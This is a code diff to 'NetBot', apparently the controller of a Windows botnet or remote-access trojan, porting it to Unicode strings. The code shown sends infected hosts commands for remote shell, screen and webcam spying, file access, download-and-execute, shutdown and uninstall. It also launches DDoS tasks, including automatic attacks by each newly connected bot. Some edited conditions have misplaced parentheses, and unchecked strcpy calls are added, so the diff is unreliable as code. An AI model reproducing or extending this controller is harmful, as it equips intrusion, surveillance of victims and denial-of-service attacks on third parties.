@@ -201,10 +201,10 @@ void CNetBotDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
 
 void CNetBotDlg::CreateIniFile()
 {
-	char Path[255];
+	TCHAR Path[255];
 	GetCurrentDirectory(255, Path);
 	CString path;
-	path.Format("%s\\NetBot.ini", Path);
+	path.Format(_T("%s\\NetBot.ini"), Path);
 	if (!m_Ini.SetPath(path))
 	{
 		m_Ini.Createini();
@@ -213,7 +213,7 @@ void CNetBotDlg::CreateIniFile()
 		m_Ini.SetKeyValue("Client Setting", "DUAutoClose", "0");
 		m_Ini.SetKeyValue("Client Setting", "Skin", "1");
 
-		m_Ini.SetKeyValue("Server Settin", "IPFile", "http://www.a.com/ip.jpg");
+		m_Ini.SetKeyValue("Server Setting", "IPFile", "http://www.a.com/ip.jpg");
 		m_Ini.SetKeyValue("Server Setting", "ConnectPass", "111111");
 
 		m_Ini.SetKeyValue("FTP Setting", "FtpAddress", "127.0.0.1");
@@ -229,9 +229,9 @@ void CNetBotDlg::CreateIniFile()
 	else
 	{
 		CString temp = m_Ini.GetKeyValue("Client Setting", "ListenPort");
-		m_ListenPort = atoi(temp);
+		m_ListenPort = _ttoi(temp);
 		temp = m_Ini.GetKeyValue("Client Setting", "MaxConnect");
-		m_ConnectMax = atoi(temp);
+		m_ConnectMax = _ttoi(temp);
 	}
 	UpdateData(FALSE);
 }
@@ -280,7 +280,7 @@ BOOL CNetBotDlg::OnInitDialog()
 	m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM, CRect(0, 0, 0, 0), this, 0x1000003);
 	int strPartDim[3] = { 350, 550, -1 };
 	m_wndStatusBar.SetParts(3, strPartDim);
-	m_wndStatusBar.SetText("当前在线主机 [0]", 2, 0);
+	m_wndStatusBar.SetText(_T("当前在线主机 [0]"), 2, 0);
 
 	//create online list
 	ListView_SetExtendedListViewStyle(m_OnLineList.m_hWnd, LVS_EX_DOUBLEBUFFER |
@@ -289,13 +289,13 @@ BOOL CNetBotDlg::OnInitDialog()
 		LVS_EX_HEADERDRAGDROP |
 		LVS_EX_CHECKBOXES);
 
-	m_OnLineList.InsertColumn(0, "IP地址/端口", LVCFMT_LEFT, 250);
-	m_OnLineList.InsertColumn(1, "计算机名", LVCFMT_LEFT, 200);
-	m_OnLineList.InsertColumn(2, "所在地域", LVCFMT_LEFT, 250);
-	m_OnLineList.InsertColumn(3, "操作系统", LVCFMT_LEFT, 350);
-	m_OnLineList.InsertColumn(4, "内存", LVCFMT_LEFT, 100);
-	m_OnLineList.InsertColumn(5, "版本", LVCFMT_LEFT, 150);
-	m_OnLineList.InsertColumn(6, "状态", LVCFMT_LEFT, 100);
+	m_OnLineList.InsertColumn(0, _T("IP地址/端口"), LVCFMT_LEFT, 250);
+	m_OnLineList.InsertColumn(1, _T("计算机名"), LVCFMT_LEFT, 200);
+	m_OnLineList.InsertColumn(2, _T("所在地域"), LVCFMT_LEFT, 250);
+	m_OnLineList.InsertColumn(3, _T("操作系统"), LVCFMT_LEFT, 350);
+	m_OnLineList.InsertColumn(4, _T("内存"), LVCFMT_LEFT, 100);
+	m_OnLineList.InsertColumn(5, _T("版本"), LVCFMT_LEFT, 150);
+	m_OnLineList.InsertColumn(6, _T("状态"), LVCFMT_LEFT, 100);
 	m_ImageOnlinelist.Create(14, 14, ILC_COLOR24 | ILC_MASK, 2, 2);
 	HICON hIcon0 = ::LoadIcon(AfxGetResourceHandle(), MAKEINTRESOURCE(IDI_LIST_ONLINE));
 	m_ImageOnlinelist.Add(hIcon0);
@@ -318,10 +318,10 @@ BOOL CNetBotDlg::OnInitDialog()
 	m_TranDlg.ShowWindow(SW_HIDE);
 
 	/*------QQWry.dat------------------------------------------------------*/
-	char Path[255];
+	TCHAR Path[255];
 	GetCurrentDirectory(255, Path);
 	CString path;
-	path.Format("%s\\QQWry.Dat", Path);
+	path.Format(_T("%s\\QQWry.Dat"), Path);
 	m_QQDat.SetPath(path);
 
 	StartListen(m_ListenPort);
@@ -421,7 +421,7 @@ LRESULT CNetBotDlg::OnCloseEvent(WPARAM wParam, LPARAM lParam)
 			if (ClientSocket == (SOCKET)m_OnLineList.GetItemData(i))
 			{
 				m_OnLineList.DeleteItem(i);
-				StatusTextOut(2, "当前在线主机 [%d]", m_OnLineList.GetItemCount());
+				StatusTextOut(2, _T("当前在线主机 [%d]"), m_OnLineList.GetItemCount());
 				break;
 			}
 		}
@@ -500,7 +500,7 @@ void CNetBotDlg::OnBtnTserver()
 
 void CNetBotDlg::OnBtnThelp()
 {
-	ShellExecute(0, "open", "help.chm", NULL, NULL, 5);
+	ShellExecute(0, _T("open"), _T("help.chm"), NULL, NULL, 5);
 }
 
 void CNetBotDlg::OnBtnTexit()
@@ -525,7 +525,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip = m_OnLineList.GetItemText(i, 3);
-			if (ip.Find("Windows XP") > 0 || ip.Find("Windows 2000") > 0 || ip.Find("Windows 2003") > 0)
+			if (ip.Find(_T("Windows XP") > 0 || ip.Find(_T("Windows 2000")) > 0 || ip.Find(_T("Windows 2003"))) > 0)
 			{
 				m_OnLineList.SetCheck(i, TRUE);
 			}
@@ -537,7 +537,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip = m_OnLineList.GetItemText(i, 3);
-			if (ip.Find("Windows 7") > 0 || ip.Find("Windows Vista") > 0)
+			if (ip.Find(_T("Windows 7") > 0 || ip.Find(_T("Windows Vista"))) > 0)
 			{
 				m_OnLineList.SetCheck(i, TRUE);
 			}
@@ -549,7 +549,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip = m_OnLineList.GetItemText(i, 3);
-			if (ip.Find("Windows 8") > 0)
+			if (ip.Find(_T("Windows 8")) > 0)
 			{
 				m_OnLineList.SetCheck(i, TRUE);
 			}
@@ -560,7 +560,7 @@ void CNetBotDlg::OnSelectComputer(UINT nID)
 		for (i = 0; i < AllNum; i++)
 		{
 			CString ip = m_OnLineList.GetItemText(i, 3);
-			if (ip.Find("Windows 10") > 0)
+			if (ip.Find(_T("Windows 10")) > 0)
 			{
 				m_OnLineList.SetCheck(i, TRUE);
 			}
@@ -667,16 +667,16 @@ void CNetBotDlg::ListenError(int ErrorCode)
 	switch (ErrorCode)
 	{
 	case 1:
-		strOutText.Format("绑定端口 %d 失败", m_ListenPort);
+		strOutText.Format(_T("绑定端口 %d 失败"), m_ListenPort);
 		break;
 	case 2:
-		strOutText.Format("监听端口 %d 失败", m_ListenPort);
+		strOutText.Format(_T("监听端口 %d 失败"), m_ListenPort);
 		break;
 	case 3:
-		strOutText.Format("监听端口 %d 成功", m_ListenPort);
+		strOutText.Format(_T("监听端口 %d 成功"), m_ListenPort);
 		break;
 	default:
-		strOutText = "没有监听……";
+		strOutText = _T("没有监听……");
 		break;
 	}
 	StatusTextOut(1, strOutText);
@@ -684,7 +684,7 @@ void CNetBotDlg::ListenError(int ErrorCode)
 
 int __stdcall ReadData(TCHAR szFile[], char **data)
 {
-	char szPath[256];
+	TCHAR szPath[256];
 	GetModuleFileName(GetModuleHandle(NULL), szPath, 256);
 
 	for (int i = lstrlen(szPath); i > 0; i--)
@@ -741,7 +741,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 		//接收上线信息
 		if (!RecvMsg(socket, chBuffer, &msgHead))
 		{
-			Dbp("can't recv msghead");
+			Dbp(_T("can't recv msghead"));
 			return 0;
 		}
 
@@ -754,7 +754,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 
 			if (SvcFileSize == -1)
 			{
-				ShowMsg("Can't read source dll.");
+				ShowMsg(_T("Can't read source dll."));
 				shutdown(socket, 0x02);
 				closesocket(socket);
 				break;
@@ -796,28 +796,29 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 			int cb = sizeof(addr);
 			getpeername(socket, (sockaddr*)&addr, &cb);
 
+			CString ip = inet_ntoa(addr.sin_addr);
 			CString OnlineIP;
-			OnlineIP.Format("%s:%u", inet_ntoa(addr.sin_addr), (DWORD)ntohs(addr.sin_port)); //将网络序转换为本机序
+			OnlineIP.Format(_T("%s:%u"), ip, (DWORD)ntohs(addr.sin_port)); //将网络序转换为本机序
 			CString Address = m_QQDat.IPtoAdd(OnlineIP);
 
 			int iCount = m_OnLineList.GetItemCount();
-			m_OnLineList.InsertItem(iCount, "", m_SysInfo.bVideo);
+			m_OnLineList.InsertItem(iCount, _T(""), m_SysInfo.bVideo);
 			m_OnLineList.SetItemData(iCount, (DWORD)socket); //Save socket
 			m_OnLineList.SetItemText(iCount, 0, OnlineIP);
-			m_OnLineList.SetItemText(iCount, 1, m_SysInfo.cComputer);
+			m_OnLineList.SetItemText(iCount, 1, CA2T(m_SysInfo.cComputer));
 			m_OnLineList.SetItemText(iCount, 2, Address);
-			m_OnLineList.SetItemText(iCount, 3, m_SysInfo.cOS);
-			m_OnLineList.SetItemText(iCount, 4, m_SysInfo.cMemorySize);
-			m_OnLineList.SetItemText(iCount, 5, m_SysInfo.cVersion);
-			m_OnLineList.SetItemText(iCount, 6, "空闲");
+			m_OnLineList.SetItemText(iCount, 3, CA2T(m_SysInfo.cOS));
+			m_OnLineList.SetItemText(iCount, 4, CA2T(m_SysInfo.cMemorySize));
+			m_OnLineList.SetItemText(iCount, 5, CA2T(m_SysInfo.cVersion));
+			m_OnLineList.SetItemText(iCount, 6, _T("空闲"));
 
-			StatusTextOut(2, "当前在线主机 [%d]", m_OnLineList.GetItemCount());
+			StatusTextOut(2, _T("当前在线主机 [%d]"), m_OnLineList.GetItemCount());
 
 			if (m_AutoAttack.bAutoAttack)
 			{
 				DdosAttack m_Attack;
 				memset(&m_Attack, 0, sizeof(DdosAttack));
-				lstrcpy(m_Attack.szTarget, m_AutoAttack.szAttackIP);
+				strcpy(m_Attack.szTarget, m_AutoAttack.szAttackIP);
 				m_Attack.iPort = m_AutoAttack.iAttackPort;
 				m_Attack.iThread = m_AutoAttack.iAttackThread;
 
@@ -826,7 +827,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 				msgHeadRep.dwSize = sizeof(DdosAttack);
 
 				SendMsg(socket, (char*)&m_Attack, &msgHeadRep);
-				m_OnLineList.SetItemText(iCount, 6, "任务0");
+				m_OnLineList.SetItemText(iCount, 6, _T("任务0"));
 			}
 		}
 		break;
@@ -974,7 +975,7 @@ int CNetBotDlg::checkfun()
 		}
 	}
 
-	StatusTextOut(2, "当前在线主机 [%d]", m_OnLineList.GetItemCount());
+	StatusTextOut(2, _T("当前在线主机 [%d]"), m_OnLineList.GetItemCount());
 
 	return 0;
 }
@@ -1040,7 +1041,7 @@ void CNetBotDlg::OnOnlineFilemanage()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [文件管理] 命令");
+			StatusTextOut(0, _T("成功发送 [文件管理] 命令"));
 		}
 		else
 		{
@@ -1050,7 +1051,7 @@ void CNetBotDlg::OnOnlineFilemanage()
 		}
 	}
 	else
-		StatusTextOut(0, "请选择操作主机");
+		StatusTextOut(0, _T("请选择操作主机"));
 }
 
 void CNetBotDlg::OnOnlineScreen()
@@ -1066,7 +1067,7 @@ void CNetBotDlg::OnOnlineScreen()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [屏幕监控] 命令");
+			StatusTextOut(0, _T("成功发送 [屏幕监控] 命令"));
 		}
 		else
 		{
@@ -1076,7 +1077,7 @@ void CNetBotDlg::OnOnlineScreen()
 		}
 	}
 	else
-		StatusTextOut(0, "请选择操作主机");
+		StatusTextOut(0, _T("请选择操作主机"));
 }
 
 void CNetBotDlg::OnOnlineProcess()
@@ -1091,7 +1092,7 @@ void CNetBotDlg::OnOnlineProcess()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [进程查询] 命令");
+			StatusTextOut(0, _T("成功发送 [进程查询] 命令"));
 		}
 		else
 		{
@@ -1101,7 +1102,7 @@ void CNetBotDlg::OnOnlineProcess()
 		}
 	}
 	else
-		StatusTextOut(0, "请选择操作主机");
+		StatusTextOut(0, _T("请选择操作主机"));
 }
 
 void CNetBotDlg::OnOnlineShell()
@@ -1116,7 +1117,7 @@ void CNetBotDlg::OnOnlineShell()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [远程Shell] 命令");
+			StatusTextOut(0, _T("成功发送 [远程Shell] 命令"));
 		}
 		else
 		{
@@ -1126,7 +1127,7 @@ void CNetBotDlg::OnOnlineShell()
 		}
 	}
 	else
-		StatusTextOut(0, "请选择操作主机");
+		StatusTextOut(0, _T("请选择操作主机"));
 }
 
 void CNetBotDlg::OnOnlineVideo()
@@ -1141,7 +1142,7 @@ void CNetBotDlg::OnOnlineVideo()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [视频捕捉] 命令");
+			StatusTextOut(0, _T("成功发送 [视频捕捉] 命令"));
 		}
 		else
 		{
@@ -1151,7 +1152,7 @@ void CNetBotDlg::OnOnlineVideo()
 		}
 	}
 	else
-		StatusTextOut(0, "请选择操作主机");
+		StatusTextOut(0, _T("请选择操作主机"));
 }
 
 void CNetBotDlg::OnOnlinePoweroff()
@@ -1166,7 +1167,7 @@ void CNetBotDlg::OnOnlinePoweroff()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [远程关机] 命令");
+			StatusTextOut(0, _T("成功发送 [远程关机] 命令"));
 		}
 		else
 		{
@@ -1189,7 +1190,7 @@ void CNetBotDlg::OnOnlineReboot()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [远程重启] 命令");
+			StatusTextOut(0, _T("成功发送 [远程重启] 命令"));
 		}
 		else
 		{
@@ -1212,7 +1213,7 @@ void CNetBotDlg::OnOnlineLogoff()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [远程注销] 命令");
+			StatusTextOut(0, _T("成功发送 [远程注销] 命令"));
 		}
 		else
 		{
@@ -1235,7 +1236,7 @@ void CNetBotDlg::OnOnlineUninstall()
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
 			//发送成功，输出信息
-			StatusTextOut(0, "成功发送 [远程卸载] 命令");
+			StatusTextOut(0, _T("成功发送 [远程卸载] 命令"));
 		}
 		else
 		{
@@ -1256,7 +1257,7 @@ void CNetBotDlg::OnOnlineRestart()
 
 		if (SendMsg(m_CurrSock, NULL, &msgHead))
 		{
-			StatusTextOut(0, "成功发送 [重新加载] 命令");
+			StatusTextOut(0, _T("成功发送 [重新加载] 命令"));
 		}
 		else
 		{
@@ -1294,7 +1295,7 @@ void CNetBotDlg::OnBtnMulpoweroff()
 		}
 	}
 
-	StatusTextOut(0, "成功发送%d条[远程关机]命令", iSendNum);
+	StatusTextOut(0, _T("成功发送%d条[远程关机]命令"), iSendNum);
 }
 
 void CNetBotDlg::OnBtnMulreboot()
@@ -1325,7 +1326,7 @@ void CNetBotDlg::OnBtnMulreboot()
 		}
 	}
 
-	StatusTextOut(0, "成功发送%d条[远程重启]命令", iSendNum);
+	StatusTextOut(0, _T("成功发送%d条[远程重启]命令"), iSendNum);
 }
 
 void CNetBotDlg::OnBtnMulexec()
@@ -1337,7 +1338,7 @@ void CNetBotDlg::OnBtnMulexec()
 
 	msgHead.dwCmd = CMD_DOWNEXEC;
 	msgHead.dwSize = m_ExecUrl.GetLength();
-	lstrcpy(chBuffer, m_ExecUrl);
+	strcpy(chBuffer, CT2A(m_ExecUrl));
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1361,7 +1362,7 @@ void CNetBotDlg::OnBtnMulexec()
 		}
 	}
 
-	StatusTextOut(0, "成功发送%d条[下载运行]命令", iSendNum);
+	StatusTextOut(0, _T("成功发送%d条[下载运行]命令"), iSendNum);
 }
 
 void CNetBotDlg::OnBtnMulopen()
@@ -1373,7 +1374,7 @@ void CNetBotDlg::OnBtnMulopen()
 
 	msgHead.dwCmd = CMD_OPENURL;
 	msgHead.dwSize = m_OpenUrl.GetLength();
-	lstrcpy(chBuffer, m_OpenUrl);
+	strcpy(chBuffer, CT2A(m_OpenUrl));
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1397,14 +1398,14 @@ void CNetBotDlg::OnBtnMulopen()
 		}
 	}
 
-	StatusTextOut(0, "成功发送%d条[打开网页]命令", iSendNum);
+	StatusTextOut(0, _T("成功发送%d条[打开网页]命令"), iSendNum);
 }
 
 int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread, int num, BOOL bAutoAttack)
 {
 	DdosAttack m_Attack;
 	memset(&m_Attack, 0, sizeof(DdosAttack));
-	lstrcpy(m_Attack.szTarget, ip);
+	strcpy(m_Attack.szTarget, CT2A(ip));
 	m_Attack.iPort = port;
 	m_Attack.iThread = thread;
 
@@ -1477,7 +1478,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
 		{
 			m_AutoAttack.bAutoAttack = TRUE;
 			m_AutoAttack.dwAttackType = msgHead.dwCmd;
-			lstrcpy(m_AutoAttack.szAttackIP, m_Attack.szTarget);
+			strcpy(m_AutoAttack.szAttackIP, m_Attack.szTarget);
 			m_AutoAttack.iAttackPort = m_Attack.iPort;
 			m_AutoAttack.iAttackThread = m_Attack.iThread;
 		}
@@ -1488,7 +1489,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
 	}
 
 	CString strTask;
-	strTask.Format("任务%d", task);
+	strTask.Format(_T("任务%d"), task);
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1499,7 +1500,7 @@ int CNetBotDlg::AttackTask(int task, CString ip, int port, int type, int thread,
 	{
 		CString status = m_OnLineList.GetItemText(i, 6);
 
-		if (status == "空闲")
+		if (status == _T("空闲"))
 		{
 			//如果是自选攻击，则设置为一个较大的数字
 			if (num < 0 || num == 100000)
@@ -1538,7 +1539,7 @@ int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int n
 {
 	DdosAttack m_Attack;
 	memset(&m_Attack, 0, sizeof(DdosAttack));
-	lstrcpy(m_Attack.szTarget, ip);
+	strcpy(m_Attack.szTarget, CT2A(ip));
 	m_Attack.iPort = port;
 	m_Attack.iThread = thread;
 	m_Attack.iExtend1 = iBegin;
@@ -1548,7 +1549,7 @@ int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int n
 	msgHead.dwCmd = CMD_DDOSSPIDERCC;
 	msgHead.dwSize = sizeof(DdosAttack);
 
-	CString strTask; strTask.Format("任务%d", task);//Spider CC Attack
+	CString strTask; strTask.Format(_T("任务%d"), task);//Spider CC Attack
 
 	CAutoLock Lock(cOnlineLock);
 
@@ -1559,7 +1560,7 @@ int CNetBotDlg::AttackSpiderCC(int task, CString ip, int port, int thread, int n
 	{
 		CString status = m_OnLineList.GetItemText(i, 6);
 
-		if (status == "空闲")
+		if (status == _T("空闲"))
 		{
 			//如果是自选攻击，则设置为一个较大的数字
 			if (num < 0 || num == 100000)
@@ -1606,7 +1607,7 @@ int CNetBotDlg::AttackStop(int task)
 	}
 
 	CString strTask;
-	strTask.Format("任务%d", task);
+	strTask.Format(_T("任务%d"), task);
 
 	CAutoLock Lock(cOnlineLock);
 	int AllNum = m_OnLineList.GetItemCount();
@@ -1621,7 +1622,7 @@ int CNetBotDlg::AttackStop(int task)
 
 			if (SendMsg(socket, NULL, &msgHead))
 			{
-				m_OnLineList.SetItemText(i, 6, "空闲");
+				m_OnLineList.SetItemText(i, 6, _T("空闲"));
 				iSendNum++;
 			}
 			else//发送失败，关闭socket
